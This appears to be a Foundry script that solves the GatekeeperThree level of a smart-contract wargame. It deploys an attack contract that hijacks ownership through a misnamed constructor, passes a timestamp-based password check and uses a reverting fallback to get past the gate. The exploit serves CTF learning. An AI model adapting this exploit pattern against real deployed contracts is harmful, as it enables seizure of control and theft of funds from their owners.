// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GatekeeperThree} from "../src/28_GatekeeperThree.sol";
import {Script, console} from "forge-std/Script.sol";

contract GatekeeperThreeSolve is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        new Attack().pwn{value: 0.001 ether + 1 wei}();

        vm.stopBroadcast();
    }
}

contract Attack {
    GatekeeperThree gate = GatekeeperThree(payable(0x28FA8d0085191C55F4D619dFa2cA0B464237734d));

    function pwn() external payable {
        gate.construct0r();
        gate.createTrick();
        gate.getAllowance(uint256(block.timestamp));
        console.log("Allowance#", gate.allowEntrance());
        address(gate).call{value: msg.value}("");
        console.log("Balance of Gate", address(gate).balance);
        gate.enter();
        console.log("Enterant#", gate.entrant());
    }

    fallback() external payable {
        revert();
    }
}
